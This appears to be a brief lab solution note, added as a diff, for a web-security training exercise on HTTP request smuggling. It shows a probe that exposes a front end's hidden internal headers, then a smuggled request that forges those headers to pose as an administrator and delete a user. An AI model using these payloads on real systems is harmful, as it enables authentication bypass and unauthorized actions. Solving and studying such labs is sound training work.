@@ -1,0 +1,27 @@
+putting this as a new request header solves the lab:
+
+foo: bar
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: 0ab20019047820c48214f38c002700ea.web-security-academy.net
+X-SSL-VERIFIED: 1
+X-SSL-CLIENT-CN: administrator
+X-FRONTEND-KEY: 5189616212674353
+
+
+
+sending this in the request header:
+foo: bar
+Content-Length: 160
+
+search=
+
+
+with the value of "test"
+
+
+gives us the hidden headers:
+X-SSL-VERIFIED: 0
+X-SSL-CLIENT-CN: null
+X-FRONTEND-KEY: 5189616212674353
+
